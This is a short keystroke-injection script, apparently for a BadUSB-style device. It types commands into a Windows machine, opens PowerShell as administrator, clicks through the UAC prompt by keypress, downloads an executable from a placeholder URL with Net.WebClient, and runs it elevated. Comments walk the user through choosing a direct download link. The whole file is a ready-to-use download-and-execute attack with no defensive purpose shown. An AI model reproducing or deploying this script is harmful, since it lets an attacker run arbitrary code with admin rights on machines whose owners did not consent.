layout('us'); //set keyboard layout to us.
typingSpeed(0,0) //set typing speed to max.
press("GUI r"); //windows button + R (Run box)
delay(2000);
type("powershell");
delay(2000);
press("control shift enter"); //run in admin mode
delay(2000);
press("left"); //press left for admin prompt
delay(200);
press("enter"); //press enter for admin prompt
delay(3000);
type("\(New-Object Net.WebClient\).DownloadFile\('FILE_URL', ' c:\\FILE.exe'\)\n"); //make sure that your url is a direct link, meaning it instantly downloads when you visit the url in your browser, if you need to press a button for the file to start downloading, right click the download button and input that url.
delay(8000);
press("GUI r"); //windows button + R (Run box)
delay(3000);
type(" c:\\FILE.exe"); //run your downloaded file
press("control shift enter"); //run your downloaded file in admin mode
delay(2000);
press("left"); //press left for admin prompt
delay(200);
press("enter"); //press enter for admin prompt
